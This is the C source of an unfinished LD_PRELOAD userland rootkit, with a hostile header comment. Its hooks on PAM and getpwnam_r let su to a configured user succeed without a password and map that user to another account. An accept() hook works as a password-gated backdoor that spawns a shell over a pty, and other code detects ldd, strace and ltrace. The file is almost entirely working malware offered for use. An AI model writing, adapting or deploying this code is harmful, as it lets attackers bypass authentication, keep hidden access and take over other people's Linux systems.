/*
    If you are reading this, N, then stop fucking stalking me and leeching off my rep mate.
    I'm writing a userland rootkit mate, even though I don't root. Cheers.

        [*] If not su'ing SU_USER, hook real functions, so they still function normally.
        [*] Gets passwd entry for JACK_USER if su'ing SU_USER (pwd.h contains the passwd struct definition, or see man page)
        [*] Wraps PAM functions handling authentication (found via ltrace) -> returns PAM_SUCCESS for SU_USER/PAM_USER (authenticates without question)

    Will add more shit when I get my pegasus.
    Already fucked your system mate, just "su h0h0" and -3 get fucked.
*/

#define  _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <pwd.h>
#include <security/pam_appl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdbool.h>
#include <pty.h>
#include <utmp.h>    // login_tty() -- may not need later.
#include "config.h"
#include "libcalls.h"

/* Non-hooks: */
void init(void) __attribute__((constructor));
void fini(void) __attribute__((destructor));
void drop_shell(int fd);
int watchdog(char *name);

void init(void)
{
    int i;
    FILE *handle;
    char *caller = NULL;
    size_t len = 0;
    bool wd_found = false;

    const char *libc_names[] = \
    {
        "getpwnam_r",
        "pam_authenticate",
        "pam_acct_mgmt",
        "accept"
    };

    if((handle = fopen("/proc/self/cmdline", "r")))
    {
        while(getdelim(&caller, &len, 0, handle) != -1 && !wd_found)
        {
            if((wd_found = watchdog(caller)))
            {
                puts("Watchdog found!\n");
                // Unload the library.
            }
        }

        free(caller);
        fclose(handle);
    }

    /* Initialise: pointers to libc functions. */
    for(i = 0; i < N_LIBCALLS; i++)
        libcalls[i] = dlsym(RTLD_NEXT, libc_names[i]);
}

void fini(void)
{
    // Cleanup.
}

void drop_shell(int fd)
{
    int master, slave;
    pid_t pid;
    char *argv[] = {SHELL_PATH, "-c", "echo 1234 > /tmp/hehe.txt", NULL};
    char pty_name[13];    // /proc/sys/kernel/pty/max generally <= 4 chars.
    char *test = "echo 123 > /tmp/456.txt\n";

    pid = forkpty(&master, pty_name, NULL, NULL);

    dprintf(fd, "Master FD: %d\n", master);
    dprintf(fd, "Current FD: %d\n", fd);

    if(pid == -1)
        dprintf(fd, "fork() error.");
    else if(pid == 0)
    {
        // dup2(master, STDOUT_FILENO);
        // dup2(master, STDERR_FILENO);

        execv(argv[0], argv);
    }
    else if(pid > 0)
    {
/*        if(write(master, test, strlen(test)) == -1)
            dprintf(fd, "write() error.\n");
        else
            dprintf(fd, "write() okay.\n"); */
    }

/*    if(openpty(&master, &slave, pty_name, NULL, NULL) == 0)
    {
        if((pid = fork()) == 0)
        {
            if(login_tty(slave) == 0)
                execv(argv[0], argv);
        }
        else if(pid > 0)
        {
            dup2(master, STDIN_FILENO);
            dup2(master, STDOUT_FILENO);
            dup2(master, STDERR_FILENO);
        }
    } */

    close(master);
//    close(slave);
}

int watchdog(char *name)
{
    size_t i, wd_size;
    const char *watchdogs[] = \
    {
        "/usr/bin/ldd",
        "strace",
        "ltrace"
    };

    wd_size = sizeof watchdogs / sizeof watchdogs[0];

    for(i = 0; i < wd_size; i++)
        if(strcmp(watchdogs[i], name) == 0)
            return 1;

    return 0;
}

/* PAM hooks: */
int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
{
    if(strcmp(SU_USER, name) == 0)
        return (int) libcalls[GETPWNAM_R](JACK_USER, pwd, buf, buflen, result);

    return (int) libcalls[GETPWNAM_R](name, pwd, buf, buflen, result);
}

int pam_authenticate(pam_handle_t *pamh, int flags)
{
    const void *item;

    pam_get_item(pamh, PAM_USER, &item);

    if(strcmp(SU_USER, item) == 0)
        return PAM_SUCCESS;

    return (int) libcalls[PAM_AUTHENTICATE](pamh, flags);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags)
{
    const void *item;

    pam_get_item(pamh, PAM_USER, &item);

    if(strcmp(SU_USER, item) == 0)
        return PAM_SUCCESS;

    return (int) libcalls[PAM_ACCT_MGMT](pamh, flags);
}

/* accept() hook/backdoor */
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
    const size_t pass_len = strlen(SHELL_PASS);
    char password[pass_len];
    unsigned short int port;
    int retfd;

    password[pass_len] = '\0';

    retfd = (int) libcalls[ACCEPT](sockfd, addr, addrlen);
    port  = ntohs(((struct sockaddr_in *) addr)->sin_port);

    if(port >= LOW_PORT && port <= HIGH_PORT)
    {
        read(retfd, password, pass_len);

        if(strcmp(password, SHELL_PASS) == 0)
            drop_shell(retfd);
    }

    return retfd;
}
